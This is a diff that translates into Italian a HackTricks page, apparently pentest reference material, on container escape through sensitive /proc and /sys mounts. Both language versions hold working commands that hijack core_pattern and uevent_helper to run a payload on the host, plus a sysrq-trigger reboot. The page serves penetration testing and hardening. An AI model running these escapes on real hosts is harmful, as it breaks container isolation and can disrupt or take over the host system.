@@ -1,154 +1,151 @@
-
-
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
 
 
-The exposure of `/proc` and `/sys` without proper namespace isolation introduces significant security risks, including attack surface enlargement and information disclosure. These directories contain sensitive files that, if misconfigured or accessed by an unauthorized user, can lead to container escape, host modification, or provide information aiding further attacks. For instance, incorrectly mounting `-v /proc:/host/proc` can bypass AppArmor protection due to its path-based nature, leaving `/host/proc` unprotected.
+L'esposizione di `/proc` e `/sys` senza un'adeguata isolamento dei namespace introduce significativi rischi per la sicurezza, tra cui l'aumento della superficie di attacco e la divulgazione di informazioni. Queste directory contengono file sensibili che, se configurati in modo errato o accessibili da un utente non autorizzato, possono portare all'escape del container, alla modifica dell'host o fornire informazioni utili per ulteriori attacchi. Ad esempio, il montaggio non corretto di `-v /proc:/host/proc` può bypassare la protezione di AppArmor a causa della sua natura basata sul percorso, lasciando `/host/proc` non protetto.
 
-**You can find further details of each potential vuln in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts).**
+**Puoi trovare ulteriori dettagli su ciascuna potenziale vulnerabilità in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts).**
 
-# procfs Vulnerabilities
+# Vulnerabilità di procfs
 
 ## `/proc/sys`
-This directory permits access to modify kernel variables, usually via `sysctl(2)`, and contains several subdirectories of concern:
+Questa directory consente l'accesso per modificare le variabili del kernel, di solito tramite `sysctl(2)`, e contiene diverse sottodirectory di interesse:
 
-### **`/proc/sys/kernel/core_pattern`**  
-   - Described in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-   - Allows defining a program to execute on core-file generation with the first 128 bytes as arguments. This can lead to code execution if the file begins with a pipe `|`.
-   - **Testing and Exploitation Example**:
-     ```bash
-     [ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
-     cd /proc/sys/kernel
-     echo "|$overlay/shell.sh" > core_pattern # Set custom handler
-     sleep 5 && ./crash & # Trigger handler
-     ```
+### **`/proc/sys/kernel/core_pattern`**
+- Descritto in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
+- Consente di definire un programma da eseguire durante la generazione del file core con i primi 128 byte come argomenti. Ciò può portare all'esecuzione del codice se il file inizia con una pipe `|`.
+- **Esempio di test e di exploit**:
+```bash
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Testa l'accesso in scrittura
+cd /proc/sys/kernel
+echo "|$overlay/shell.sh" > core_pattern # Imposta un gestore personalizzato
+sleep 5 && ./crash & # Attiva il gestore
+```
 
 ### **`/proc/sys/kernel/modprobe`**
-   - Detailed in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-   - Contains the path to the kernel module loader, invoked for loading kernel modules.
-   - **Checking Access Example**:
-     ```bash
-     ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
-     ```
+- Descritto in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Contiene il percorso del caricatore del modulo del kernel, invocato per il caricamento dei moduli del kernel.
+- **Esempio di controllo dell'accesso**:
+```bash
+ls -l $(cat /proc/sys/kernel/modprobe) # Controlla l'accesso a modprobe
+```
 
 ### **`/proc/sys/vm/panic_on_oom`**
-   - Referenced in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-   - A global flag that controls whether the kernel panics or invokes the OOM killer when an OOM condition occurs.
+- Citato in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Un flag globale che controlla se il kernel va in panic o invoca l'OOM killer quando si verifica una condizione OOM.
 
 ### **`/proc/sys/fs`**
-   - As per [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contains options and information about the file system.
-   - Write access can enable various denial-of-service attacks against the host.
+- Come indicato in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contiene opzioni e informazioni sul file system.
+- L'accesso in scrittura può consentire vari attacchi di negazione del servizio contro l'host.
 
 ### **`/proc/sys/fs/binfmt_misc`**
-   - Allows registering interpreters for non-native binary formats based on their magic number.
-   - Can lead to privilege escalation or root shell access if `/proc/sys/fs/binfmt_misc/register` is writable.
-   - Relevant exploit and explanation:
-     - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
-     - In-depth tutorial: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+- Consente di registrare interpreti per formati binari non nativi in base al loro numero magico.
+- Può portare a un'escalation dei privilegi o all'accesso alla shell di root se `/proc/sys/fs/binfmt_misc/register` è scrivibile.
+- Exploit rilevante e spiegazione:
+- [Rootkit da uomo povero tramite binfmt_misc](https://github.com/toffan/binfmt_misc)
+- Tutorial approfondito: [Link al video](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-## Others in `/proc`
+## Altri in `/proc`
 
 ### **`/proc/config.gz`**
-   - May reveal the kernel configuration if `CONFIG_IKCONFIG_PROC` is enabled.
-   - Useful for attackers to identify vulnerabilities in the running kernel.
+- Può rivelare la configurazione del kernel se `CONFIG_IKCONFIG_PROC` è abilitato.
+- Utile per gli attaccanti per identificare vulnerabilità nel kernel in esecuzione.
 
 ### **`/proc/sysrq-trigger`**
-   - Allows invoking Sysrq commands, potentially causing immediate system reboots or other critical actions.
-   - **Rebooting Host Example**:
-     ```bash
-     echo b > /proc/sysrq-trigger # Reboots the host
-     ```
+- Consente di invocare comandi Sysrq, causando potenzialmente riavvii immediati del sistema o altre azioni critiche.
+- **Esempio di riavvio dell'host**:
+```bash
+echo b > /proc/sysrq-trigger # Riavvia l'host
+```
 
 ### **`/proc/kmsg`**
-   - Exposes kernel ring buffer messages.
-   - Can aid in kernel exploits, address leaks, and provide sensitive system information.
+- Espone i messaggi del buffer circolare del kernel.
+- Può aiutare negli exploit del kernel, nelle falle di indirizzo e fornire informazioni sensibili sul sistema.
 
 ### **`/proc/kallsyms`**
-   - Lists kernel exported symbols and their addresses.
-   - Essential for kernel exploit development, especially for overcoming KASLR.
-   - Address information is restricted with `kptr_restrict` set to `1` or `2`.
-   - Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Elenca i simboli esportati dal kernel e i loro indirizzi.
+- Fondamentale per lo sviluppo di exploit del kernel, soprattutto per superare KASLR.
+- Le informazioni sugli indirizzi sono limitate con `kptr_restrict` impostato su `1` o `2`.
+- Dettagli in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 ### **`/proc/[pid]/mem`**
-   - Interfaces with the kernel memory device `/dev/mem`.
-   - Historically vulnerable to privilege escalation attacks.
-   - More on [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Interagisce con il dispositivo di memoria del kernel `/dev/mem`.
+- Storicamente vulnerabile agli attacchi di escalation dei privilegi.
+- Maggiori informazioni su [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 ### **`/proc/kcore`**
-   - Represents the system's physical memory in ELF core format.
-   - Reading can leak host system and other containers' memory contents.
-   - Large file size can lead to reading issues or software crashes.
-   - Detailed usage in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
+- Rappresenta la memoria fisica del sistema in formato core ELF.
+- La lettura può rivelare il contenuto della memoria dell'host e di altri container.
+- Le dimensioni del file possono causare problemi di lettura o crash del software.
+- Utilizzo dettagliato in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 ### **`/proc/kmem`**
-   - Alternate interface for `/dev/kmem`, representing kernel virtual memory.
-   - Allows reading and writing, hence direct modification of kernel memory.
+- Interfaccia alternativa per `/dev/kmem`, che rappresenta la memoria virtuale del kernel.
+- Consente la lettura e la scrittura, quindi la modifica diretta della memoria del kernel.
 
 ### **`/proc/mem`**
-   - Alternate interface for `/dev/mem`, representing physical memory.
-   - Allows reading and writing, modification of all memory requires resolving virtual to physical addresses.
+- Interfaccia alternativa per `/dev/mem`, che rappresenta la memoria fisica.
+- Consente la lettura e la scrittura, la modifica di tutta la memoria richiede la risoluzione degli indirizzi virtuali in fisici.
 
 ### **`/proc/sched_debug`**
-   - Returns process scheduling information, bypassing PID namespace protections.
-   - Exposes process names, IDs, and cgroup identifiers.
+- Restituisce informazioni sulla pianificazione dei processi, bypassando le protezioni dello spazio dei nomi PID.
+- Espone i nomi dei processi, gli ID e gli identificatori del cgroup.
 
 ### **`/proc/[pid]/mountinfo`**
-   - Provides information about mount points in the process's mount namespace.
-   - Exposes the location of the container `rootfs` or image.
+- Fornisce informazioni sui punti di mount nel namespace di mount del processo.
+- Espone la posizione del `rootfs` o dell'immagine del container.
 
-## `/sys` Vulnerabilities
+## Vulnerabilità di `/sys`
 
 ### **`/sys/kernel/uevent_helper`**
-   - Used for handling kernel device `uevents`.
-   - Writing to `/sys/kernel/uevent_helper` can execute arbitrary scripts upon `uevent` triggers.
-   - **Example for Exploitation**:
-     %%%bash
-     # Creates a payload
-     echo "#!/bin/sh" > /evil-helper
-     echo "ps > /output" >> /evil-helper
-     chmod +x /evil-helper
-     # Finds host path from OverlayFS mount for container
-     host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
-     # Sets uevent_helper to malicious helper
-     echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
-     # Triggers a uevent
-     echo change > /sys/class/mem/null/uevent
-     # Reads the output
-     cat /output
-     %%%
-
+- Utilizzato per gestire gli `uevent` dei dispositivi del kernel.
+- La scrittura su `/sys/kernel/uevent_helper` può eseguire script arbitrari al verificarsi di `uevent` triggers.
+- **Esempio di exploit**:
+%%%bash
+# Crea un payload
+echo "#!/bin/sh" > /evil-helper
+echo "ps > /output" >> /evil-helper
+chmod +x /evil-helper
+# Trova il percorso dell'host dal mount OverlayFS per il container
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+# Imposta uevent_helper su un helper maligno
+echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
+# Attiva un uevent
+echo change > /sys/class/mem/null/uevent
+# Legge l'output
+cat /output
+%%%
 ### **`/sys/class/thermal`**
-   - Controls temperature settings, potentially causing DoS attacks or physical damage.
+- Controlla le impostazioni di temperatura, potenzialmente causando attacchi DoS o danni fisici.
 
 ### **`/sys/kernel/vmcoreinfo`**
-   - Leaks kernel addresses, potentially compromising KASLR.
+- Rileva gli indirizzi del kernel, compromettendo potenzialmente KASLR.
 
 ### **`/sys/kernel/security`**
-   - Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
-   - Access might enable a container to disable its MAC system.
+- Contiene l'interfaccia `securityfs`, che consente la configurazione dei moduli di sicurezza Linux come AppArmor.
+- L'accesso potrebbe consentire a un contenitore di disabilitare il suo sistema MAC.
 
-### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
-   - Exposes interfaces for interacting with EFI variables in NVRAM.
-   - Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.
+### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**
+- Espone interfacce per interagire con le variabili EFI nella NVRAM.
+- Una configurazione errata o un'exploit possono causare il blocco di laptop o l'impossibilità di avviare le macchine host.
 
 ### **`/sys/kernel/debug`**
-   - `debugfs` offers a "no rules" debugging interface to the kernel.
-   - History of security issues due to its unrestricted nature.
+- `debugfs` offre un'interfaccia di debug "senza regole" al kernel.
+- Storia di problemi di sicurezza dovuti alla sua natura non limitata.
 
 
-## References
+## Riferimenti
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 * [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
 * [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
@@ -156,16 +153,14 @@ This directory permits access to modify kernel variables, usually via `sysctl(2)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-
-
